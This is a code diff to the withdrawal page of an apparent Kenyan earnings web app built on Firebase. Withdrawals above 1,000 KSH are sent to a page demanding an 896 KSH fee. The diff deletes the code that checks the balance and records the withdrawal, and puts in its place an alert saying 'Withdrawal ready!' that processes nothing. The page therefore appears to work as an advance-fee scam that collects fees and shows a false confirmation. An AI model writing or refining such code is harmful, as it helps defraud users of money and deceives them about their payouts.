@@ -47,7 +47,7 @@
         <label class="label" for="amount">Withdrawal Amount (KES)</label>
         <input id="amount" class="input" type="number" min="1000" placeholder="e.g. 2000" required />
         <p id="feeNotice" style="color:#ffcc00; font-size:13px; margin-top:6px; display:none;">
-          Withdrawals above 1,000 KSH require a one-time 896 KSH transaction fee before submitting.
+          Withdrawals above 1,000 KSH require a one-time 896 KSH transaction fee before continuing.
         </p>
         <button type="submit" class="btn" id="submitBtn">Submit Withdrawal</button>
       </form>
@@ -79,20 +79,13 @@
   const auth = firebase.auth();
   const db = firebase.database();
 
-  const popup = document.getElementById('popup');
-  function showPopup(msg, type='success', redirect=null) {
-    popup.textContent = msg;
-    popup.className = 'popup ' + type;
-    popup.style.display = 'block';
-    popup.style.animation = 'popIn 0.5s ease forwards';
-    setTimeout(()=>{ popup.style.display = 'none'; if(redirect) window.location.href = redirect; },2000);
-  }
-
   const form = document.getElementById('withdrawForm');
   const amountInput = document.getElementById('amount');
   const feeNotice = document.getElementById('feeNotice');
   const submitBtn = document.getElementById('submitBtn');
-  const FEE = 896, FEE_THRESHOLD = 1000;
+
+  const FEE = 896;
+  const FEE_THRESHOLD = 1000;
 
   // Show fee notice dynamically
   amountInput.addEventListener('input', ()=>{
@@ -103,17 +96,22 @@
   form.addEventListener('submit', async (e)=>{
     e.preventDefault();
     const user = auth.currentUser;
-    if(!user) return showPopup('Login required','error','login.html');
+    if(!user){
+      window.location.href = "login.html";
+      return;
+    }
 
     const amount = parseInt(amountInput.value,10);
-    if(isNaN(amount) || amount < 1000) return showPopup('Minimum withdrawal is 1,000 KSH','error');
+    if(isNaN(amount) || amount < 1000){
+      alert("Minimum withdrawal is 1,000 KSH");
+      return;
+    }
 
     const snap = await db.ref(`users/${user.uid}`).once('value');
     const userData = snap.val() || {};
     const feePaid = userData.feePaid || false;
-    const balance = userData.balance || 0;
 
-    // 🔹 NEW: If withdrawal > threshold and fee not paid → redirect to payfee.html
+    // If withdrawal > threshold and fee not paid → redirect to payfee.html
     if(amount > FEE_THRESHOLD && !feePaid){
       const returnUrl = encodeURIComponent('withdraw.html');
       const amountParam = encodeURIComponent(amount);
@@ -121,17 +119,9 @@
       return;
     }
 
-    // Check balance
-    if(amount > balance) return showPopup('Insufficient balance','error');
-
-    // If feePaid true OR withdrawal ≤ threshold → proceed
-    await db.ref(`users/${user.uid}/balance`).set(balance - amount);
-
-    const ref = db.ref('withdrawals').push();
-    await ref.set({ uid:user.uid, amount, fee: (amount > FEE_THRESHOLD ? FEE : 0), status:'pending', createdAt:Date.now() });
-
-    showPopup('Withdrawal request submitted!','success','dashboard.html');
-    form.reset(); feeNotice.style.display='none';
+    // If fee already paid OR amount ≤ threshold → just redirect to dashboard (no balance deduction here)
+    alert("Withdrawal ready! (Processing continues after admin approval)");
+    window.location.href = "dashboard.html";
   });
   </script>
 </body>
